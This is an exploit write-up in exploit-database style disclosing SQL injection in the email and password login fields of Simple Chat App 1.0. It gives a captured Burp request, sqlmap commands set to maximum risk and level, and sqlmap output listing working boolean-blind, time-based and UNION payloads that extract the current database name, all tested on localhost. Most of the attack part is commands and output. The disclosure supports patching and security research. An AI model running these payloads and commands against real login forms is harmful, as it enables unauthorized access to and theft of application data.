# Simple Chat App - SQL Injection - 1
+ **Exploit Title:** Simple Chat App - SQL Injection - 1
+ **Date:** 2024-12-05
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/simple-chat-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/55a2b6be-cd54-4114-8d04-2ba66d0bc11a 
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Simple Chat App 1.0 allows SQL Injection via the 'email' and 'password' parameters at "localhost/chat_project/login.php/". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/chat_project/login.php/"
+ Write something random in the email and password fields and press the login button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /chat_project/login.php HTTP/1.1
Host: localhost
Content-Length: 34
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/chat_project/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss
Connection: close

email=a%40mail.com&password=123456

```
### Email
+ Use sqlmap to exploit. In sqlmap, use 'email' parameter to dump the database.
```
sqlmap -r r.txt -p email --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: email=a@mail.com' AND 9749=9749-- KdYx&password=123456

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=a@mail.com' AND (SELECT 9877 FROM (SELECT(SLEEP(5)))lVQU)-- EjZN&password=123456

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: email=-7652' UNION ALL SELECT NULL,CONCAT(0x71766a6271,0x457763724c4c4168474a74424569556541765061755964454256745558495952424142794f456d4d,0x71707a7171),NULL,NULL,NULL,NULL,NULL-- -&password=123456
---
[11:18:16] [INFO] the back-end DBMS is MySQL
web application technology: PHP, Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:18:17] [INFO] fetching current database
current database: 'tutorial_db'

```
+ current database: `tutorial_db`

![Ekran görüntüsü 2024-05-15 043749](https://github.com/BurakSevben/CVEs/assets/117217689/a9d89518-a797-455b-91e4-75e0f3836a87)



### Password
+ Use sqlmap to exploit. In sqlmap, use 'password' parameter to dump the database.
```
sqlmap -r r.txt -p password --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: email=a@mail.com&password=123456' AND 1803=1803-- qtWF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=a@mail.com&password=123456' AND (SELECT 9368 FROM (SELECT(SLEEP(5)))Jxjo)-- Dafc

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: email=a@mail.com&password=-4638' UNION ALL SELECT NULL,CONCAT(0x71766a6271,0x7653587a4a7542676a55416f514a655366464b576b4b4c447977694f616b676e4b68757a554f6c76,0x71707a7171),NULL,NULL,NULL,NULL,NULL-- -
---
[11:19:31] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:19:31] [INFO] fetching current database
current database: 'tutorial_db'

```
+ current database: `tutorial_db`

![Ekran görüntüsü 2024-05-15 044215](https://github.com/BurakSevben/CVEs/assets/117217689/b520c059-50ca-43c3-b3f9-2d1f1eab9cc1)
